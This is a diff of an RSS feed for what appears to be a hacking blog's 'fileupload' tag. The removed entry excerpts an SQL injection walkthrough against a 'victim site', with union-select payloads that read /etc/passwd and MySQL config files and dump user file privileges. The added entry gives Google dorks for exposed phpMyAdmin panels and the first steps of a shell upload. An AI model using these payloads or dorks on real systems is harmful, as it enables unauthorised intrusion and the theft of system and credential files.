@@ -14,7 +14,7 @@
     <managingEditor>thiklab@gmail.com (Thik)</managingEditor>
     <webMaster>thiklab@gmail.com (Thik)</webMaster>
     <copyright>&lt;a rel=&#39;license&#39; target=&#39;_blank&#39; href=&#39;http://creativecommons.org/licenses/by-sa/4.0/&#39;&gt;&lt;img alt=&#39;Creative Commons License&#39; style=&#39;border-width:0;display:block;margin-left:auto;margin-right:auto;&#39; src=&#39;https://i.creativecommons.org/l/by-sa/4.0/88x31.png&#39; /&gt;&lt;/a&gt;&amp;copy;2019 - {year} All content is licensed under &lt;a rel=&#39;license&#39; target=&#39;_blank&#39; href=&#39;http://creativecommons.org/licenses/by-sa/4.0/&#39;&gt;CC BY-SA&lt;/a&gt;.</copyright>
-    <lastBuildDate>Thu, 18 Mar 2021 10:01:06 +0900</lastBuildDate>
+    <lastBuildDate>Thu, 01 Apr 2021 10:01:06 +0700</lastBuildDate>
     
         <atom:link href="https://thiklab.com/tags/fileupload/index.xml" rel="self" type="application/rss+xml" />
     
@@ -23,27 +23,18 @@
 
       
       <item>
-        <title>SQL Injection To File Upload</title>
-        <link>https://thiklab.com/posts/sql-injection-to-file-upload/</link>
-        <pubDate>Thu, 18 Mar 2021 10:01:06 +0900</pubDate>
+        <title>Upload Shell Via phpMyAdmin</title>
+        <link>https://thiklab.com/posts/upload-shell-via-phpmyadmin/</link>
+        <pubDate>Thu, 01 Apr 2021 10:01:06 +0700</pubDate>
         <author>thiklab@gmail.com (Thik)</author>
-        <atom:modified>Thu, 18 Mar 2021 10:01:06 +0900</atom:modified>
-        <guid>https://thiklab.com/posts/sql-injection-to-file-upload/</guid>
-        <description>Requirements  Root User Root Path of the website A Writeable Directory  SQL Injection Path First of all we have to find sql injection vulnerable on a victim site.
- site.com/list.php?id=7
- Checking cunrrent username.
- site.com/list.php?id=-7+union+select+1,current_user,3,4,5&amp;ndash;
-+ load_file(&#39;/etc/passwd&#39;)
-+ load_file(&#39;/etc/my.cnf&#39;)&amp;gt;
-+ load_file(&#39;/etc/group&#39;)&amp;gt;
-+ load_file(&#39;/etc/services&#39;)&amp;gt;
-+ load_file(&#39;/etc/hosts&#39;)&amp;gt;
- Then checking whatever it&amp;rsquo;s a root user or not.
- site.com/list.php?id=-7+union+select+1,(SELECT+GROUP_CONCAT(user,0x202d3e20,file_priv,0x3c62723e) FROM mysql.user),3,4,5&amp;ndash;
- If it show YES that meant it&amp;rsquo;s writeable.</description>
+        <atom:modified>Thu, 01 Apr 2021 10:01:06 +0700</atom:modified>
+        <guid>https://thiklab.com/posts/upload-shell-via-phpmyadmin/</guid>
+        <description>Google Dorks  allinurl:index.php?db=information_schema allinurl:/read_dump.php?  SQL Query Go to phpMyadmin database and create new database, ex: &amp;ldquo;uploader&amp;rdquo; and than select on SQL tap and paste this code below.
+1 2 3  CREATE TABLE `uploader`.`userform` ( `track1` VARCHAR( 1000 ) NOT NULL ) ENGINE = MYISAM ;   And this code.
+1 2 3  CREATE TABLE `uploader`.`user_upload` ( `track2` VARCHAR( 1000 ) NOT NULL ) ENGINE = MYISAM ;   Now select on table user_upload and SQL tap and paste this code below.</description>
         
         <dc:creator>thik</dc:creator>
-        <media:content url="https://thiklab.comimages/feature/sqli.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        <media:content url="https://thiklab.comimages/feature/article-one.png" medium="image"><media:title type="html">featured image</media:title></media:content>
         
         
         
@@ -52,12 +43,22 @@
               <category>fileupload</category>
             
           
-        
+            
+              <category>googledork</category>
+            
+          
         
         
           
             
               <category>SQLi</category>
+            
+          
+        
+        
+          
+            
+              <category>WebApp</category>
             
           
         
